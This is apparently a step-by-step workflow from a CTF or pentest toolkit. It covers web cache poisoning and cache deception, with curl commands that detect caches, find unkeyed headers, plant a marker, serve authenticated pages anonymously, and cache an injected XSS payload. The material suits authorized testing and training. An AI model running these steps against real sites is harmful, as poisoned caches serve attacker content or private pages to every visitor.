# Workflow — the cache-poisoning attack, step by step

The operator's sequence — each step's check and failure.

---

## Phase 0 — classify — is this a cache-poisoning

```bash
python3 tools/classify.py --source <dir>
python3 tools/chain_match.py --source <dir> --record <challenge>
```

```text
the signals: a cache-status header, a Vary header, an unkeyed input.
a chain card match → run the card's first_confirming_probe first.
```

## Phase 1 — detect the cache — a stored-response surface

```bash
# the cache status — a HIT/MISS/AGE header
curl -sI "$BASE/" | grep -iE 'x-cache|cf-cache|age:|via:|x-varnish|x-served-by'
#   X-Cache-Status: HIT/MISS — nginx; CF-Cache-Status — Cloudflare
```

## Phase 2 — map the cache key — what's keyed

```bash
# the Vary header — which headers vary the cache
curl -sI "$BASE/" | grep -i 'vary'
# the proxy's cache-key config
grep -rnoiE 'proxy_cache_key|cache_key|vcl_hash|make_cache_key' <src> | head -10
```

```text
the key = the request parts that determine the stored entry.
everything NOT in the key is an unkeyed input.
```

## Phase 3 — find the unkeyed input — the poisoning vector

```bash
# for each candidate — send it → check the stored copy
for h in 'X-Forwarded-Host' 'X-Original-URL' 'User-Agent' 'Referer' 'Accept-Language'; do
  curl "$BASE/page?cb=<unique>" -H "$h: <marker>"
  curl "$BASE/page?cb=<unique>" | grep '<marker>' && echo "$h UNKEYED"
done
```

## Phase 4 — the poisoning request — the canary

```bash
# send the input → the stored copy carries it
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'
# the stored entry is keyed on the URL — YOUR header's effect is stored
```

## Phase 5 — the confirmation — the clean-request read

```bash
# a clean request — a different session, the same URL
curl "$BASE/page?cb=<unique>"
#   <marker> reflected → poisoned → confirmed
#   the cache-status shows HIT — the stored copy served YOUR input
```

```text
the confirm: the marker persists into the clean response AND the
cache indicator shows the stored copy served it. a reflected marker
on a MISS is not a poisoning.
```

## Phase 6 — the deception — the authenticated-page-served-anonymously

```bash
# an authenticated GET stores the privileged page
curl "$BASE/settings.html?cb=<unique>" -H 'Cookie: <auth>'
# an anonymous GET — the stored copy serves it
curl "$BASE/settings.html?cb=<unique>"   # anonymous — HIT?
```

## Phase 7 — the payload — the injected content

```text
a reflected unkeyed input can carry a payload — a JS, a redirect, a
host-rewrite — the stored copy serves it to every requester. the
verified card's shape: an injected charset XSS stored in the cached
page.
```

## Phase 8 — the blast-radius — the shared-store effect

```text
a poisoned entry is served to EVERY requester of the URL until it
expires — the deception's blast radius is the URL's requester base.
use a harmless marker; keep the time-window short; clean up.
```

## Phase 9 — the TTL — the expiry question

```bash
# the stored entry's age — the TTL's remaining window
curl -sI "$BASE/page?cb=<unique>" | grep -iE 'age|cache-control|expires'
```

## Phase 10 — the falsifier — when to move

```text
the input IS part of the cache key — the stored copy is keyed per-
input → a different class.
no front-end cache → no stored response → a different class.
a reflected marker on a MISS → not a stored copy → a different class.
```
